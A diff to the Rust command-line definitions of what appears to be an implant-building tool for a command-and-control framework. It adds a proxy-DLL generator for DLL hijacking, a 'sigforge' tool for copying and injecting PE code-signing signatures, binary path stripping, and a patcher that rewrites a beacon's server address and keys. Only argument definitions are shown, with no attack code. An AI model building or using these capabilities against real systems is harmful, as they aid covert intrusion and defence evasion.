@@ -1,6 +1,7 @@
 use std::str::FromStr;
 
-use crate::{GenerateArch, Platform, Version};
+use crate::config::{GenerateArch, Version};
+use crate::Platform;
 use clap::{Parser, Subcommand};
 use strum_macros::Display;
 
@@ -20,8 +21,12 @@ pub enum Commands {
         version: Version,
 
         /// Config file path
-        #[arg(long, short = 'c', global = true, default_value = "config.yaml")]
+        #[arg(long, short = 'c', global = true, default_value = "implant.yaml")]
         config: String,
+
+        /// Choice use source code or prebuild
+        #[arg(long, short = 's', global = true, default_value = "true")]
+        source: bool,
 
         #[command(subcommand)]
         command: GenerateCommands,
@@ -30,7 +35,7 @@ pub enum Commands {
     /// auto build
     Build {
         /// Config file path
-        #[arg(long, short = 'c', global = true, default_value = "config.yaml")]
+        #[arg(long, short = 'c', global = true, default_value = "implant.yaml")]
         config: String,
 
         #[arg(
@@ -60,6 +65,7 @@ pub enum GenerateCommands {
 
     /// Config prelude
     Prelude {
+        #[arg(default_value = "prelude.yaml")]
         yaml_path: String,
 
         /// Custom resources dir, default "./resources/"
@@ -79,6 +85,29 @@ pub enum GenerateCommands {
         /// Choice modules
         #[arg(long, short = 'm', default_value = "")]
         module: String,
+    },
+
+    /// Generate ProxyDLL for DLL hijacking
+    ProxyDLL {
+        /// Raw DLL path (for parsing exports). If not specified, reads from config file.
+        #[arg(long, short = 'r', default_value = "")]
+        raw_dll: String,
+
+        /// Proxied DLL path (runtime forwarding target). If not specified, reads from config file.
+        #[arg(long, short = 'p', default_value = "")]
+        proxied_dll: String,
+
+        /// Proxy DLL name (generated proxy DLL name). Optional, defaults to proxied DLL's filename.
+        #[arg(long, short = 'o')]
+        proxy_dll: Option<String>,
+
+        /// Comma-separated exports to hijack for payload execution
+        #[arg(long, short = 'e', default_value = "")]
+        hijacked_exports: String,
+
+        /// Use NtCreateThreadEx instead of std::thread
+        #[arg(long)]
+        native_thread: bool,
     },
 
     /// Generate pulse
@@ -123,6 +152,8 @@ pub enum PayloadType {
     MODULES,
     #[strum(serialize = "malefic-3rd")]
     THIRD,
+    #[strum(serialize = "malefic-proxydll")]
+    PROXYDLL,
 }
 
 #[derive(Subcommand)]
@@ -150,6 +181,60 @@ pub enum BuildCommands {
 
     /// Build pulse
     Pulse,
+
+    /// Build proxy-dll
+    #[command(name = "proxy-dll")]
+    ProxyDll,
+}
+
+#[derive(Subcommand)]
+pub enum SigForgeCommands {
+    /// Extract signature from a signed PE file
+    Extract {
+        /// Input PE file
+        #[arg(short = 'i', long)]
+        input: String,
+        /// Output signature file
+        #[arg(short = 'o', long)]
+        output: Option<String>,
+    },
+    /// Copy signature from one PE file to another
+    Copy {
+        /// Source PE file (signed)
+        #[arg(short = 's', long)]
+        source: String,
+        /// Target PE file (to be signed)
+        #[arg(short = 't', long)]
+        target: String,
+        /// Output file path
+        #[arg(short = 'o', long)]
+        output: Option<String>,
+    },
+    /// Inject signature from file into PE file
+    Inject {
+        /// Signature file
+        #[arg(short = 's', long)]
+        signature: String,
+        /// Target PE file
+        #[arg(short = 't', long)]
+        target: String,
+        /// Output file path
+        #[arg(short = 'o', long)]
+        output: Option<String>,
+    },
+    /// Remove signature from PE file
+    Remove {
+        /// Input PE file
+        #[arg(short = 'i', long)]
+        input: String,
+        /// Output file path
+        #[arg(short = 'o', long)]
+        output: Option<String>,
+    },
+    Check {
+        #[arg(short = 'i', long)]
+        input: String,
+    },
 }
 
 #[derive(Subcommand)]
@@ -205,5 +290,69 @@ pub enum Tool {
         /// User data path
         #[arg(long, default_value = "")]
         userdata_path: String,
+    },
+
+    /// Strip paths from binary files
+    STRIP {
+        /// Source binary file path
+        #[arg(long, short = 'i')]
+        input: String,
+
+        /// Output binary file path
+        #[arg(long, short = 'o')]
+        output: String,
+
+        /// Additional custom paths to replace (comma separated)
+        #[arg(long, default_value = "")]
+        custom_paths: String,
+    },
+
+    /// Object copy utility (similar to objcopy)
+    #[command(name = "objcopy")]
+    OBJCOPY {
+        /// Output format (binary for -O binary)
+        #[arg(short = 'O')]
+        output_format: String,
+
+        /// Input file path
+        input: String,
+
+        /// Output file path
+        output: String,
+    },
+
+    /// PE file signature manipulation tool
+    #[command(name = "sigforge")]
+    SigForge {
+        #[command(subcommand)]
+        command: SigForgeCommands,
+    },
+
+    /// Patch compiled binaries (NAME / KEY / SERVER address)
+    #[command(name = "patch")]
+    Patch {
+        /// Target binary file (e.g. malefic.exe)
+        #[arg(long, short = 'f')]
+        file: String,
+
+        /// New NAME value (beacon name)
+        #[arg(long)]
+        name: Option<String>,
+
+        /// New KEY value (encryption key)
+        #[arg(long)]
+        key: Option<String>,
+
+        /// New server address (e.g. 192.168.1.100:5001)
+        #[arg(long)]
+        server_address: Option<String>,
+
+        /// Output file path (defaults to <file>.patched)
+        #[arg(long, short = 'o')]
+        output: Option<String>,
+
+        /// Override XOR key (defaults to basic.key from implant.yaml)
+        #[arg(long = "xor-key")]
+        xor_key: Option<String>,
     },
 }
